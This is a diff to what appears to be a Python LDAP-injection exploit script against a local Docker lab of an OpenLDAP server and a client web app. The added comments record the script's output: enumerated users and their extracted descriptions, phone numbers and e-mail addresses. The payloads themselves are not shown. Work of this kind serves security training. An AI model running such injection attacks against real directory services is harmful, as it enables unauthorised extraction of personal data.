@@ -6,6 +6,31 @@
 # docker build -t ldap-client-container .
 # docker run -dit --link openldap-container -p 8888:80 ldap-client-container
 
+# OUTPUT
+# python3 ldap-injection.py
+#[◒] Starting user enumeration: Found users ['admin', 'andy', 'omar', 'zey']
+
+#[┬] Getting descriptions: User zey
+#[*] Description for admin: 'ldap administrator'
+#[*] Description for andy: 'not even hacker'
+#[*] Description for omar: 'not the best hacker ever'
+#[*] Description for zey: 'best hacker ever'
+
+#[◥] Getting phone numbers: User zey
+#[*] Phone for admin: ''
+#[*] Phone for andy: '4140001234'
+#[*] Phone for omar: '4141114321'
+#[*] Phone for zey: '4145559999'
+
+
+#[*] Getting phone numbers: User zey
+#[*] E-Mail for admin: ''
+#[*] E-Mail for andy: 'andy@example.org'
+#[*] E-Mail for omar: 'omar@example.org'
+#[*] E-Mail for zey: 'zey@example.org'
+
+
+
 from pwn import *
 import requests, sys, time, string, signal, pdb
 
